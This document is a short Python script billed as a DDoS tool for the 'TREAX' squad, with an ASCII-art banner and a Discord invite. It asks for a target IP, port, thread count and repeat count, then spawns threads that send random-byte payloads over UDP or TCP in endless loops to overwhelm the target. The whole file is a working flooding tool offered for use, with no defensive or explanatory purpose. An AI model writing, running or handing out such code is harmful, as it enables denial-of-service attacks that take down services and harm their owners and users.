#!/usr/bin/env python3
import random
import socket
import threading
import os
import codecs, sys

os.system("clear ") 

print("\033[93 ████████╗██████╗░███████╗░█████╗░██╗░░██╗ \033[93m") 
print("\033[93 ╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝ \033[93m")
print("\033[93 ░░░██║░░░██████╔╝█████╗░░███████║░╚███╔╝░ \033[93m") 
print("\033[94 ░░░██║░░░██╔══██╗██╔══╝░░██╔══██║░██╔██╗░ \033[94m") 
print("\033[94 ░░░██║░░░██║░░██║███████╗██║░░██║██╔╝╚██╗ \033[94m") 
print("\033[94 ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ \033[94m") 
print("DDoS Tools For My Squad : TREAX ") 
print("Join to my squad discord link ")
print("TREAX SQUAD : https://discord.gg/ScPy4SMc ") 
    
ip = str(input("  IP Target :"))
port = int(input(" PORT Target :"))
choice = str(input(" Are You Seriously? (y/n) :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(8080)
	i = random.choice(("[+]","[-]","[=]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" TREAX COMMUNITY!!! ")
		except:
			print("[-] Server Has Been Maintenance")

def run2():
	data = random._urandom(6500)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TREAX COMMUNITY!!! ")
		except:
			s.close()
			print("[-] Server Has Been Maintenance")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
